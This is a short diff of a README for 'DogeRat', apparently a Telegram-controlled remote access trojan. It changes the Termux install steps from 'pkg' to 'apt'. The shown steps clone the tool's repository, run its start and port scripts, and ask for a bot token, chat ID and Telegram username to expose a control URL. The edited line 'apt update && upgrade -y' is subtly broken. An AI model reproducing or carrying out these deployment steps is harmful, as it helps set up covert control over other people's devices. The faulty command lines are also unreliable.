@@ -71,8 +71,8 @@
 
 
 ```bash  
-  pkg update && upgrade -y
-  pkg install git -y
+  apt update && upgrade -y
+  apt install git -y
   git clone https://github.com/himanshusky584/DogeRat_
   cd DogeRat_
   bash start.sh
@@ -80,7 +80,7 @@ Enter your bot token
 Enter your chatid 
 And hit enter
 Now open a new Tab, and give these commands
-pkg install openssh
+apt install openssh
 bash port.sh 
 Enter your telegram username And hit enter 
 Copy url and minimize the termux
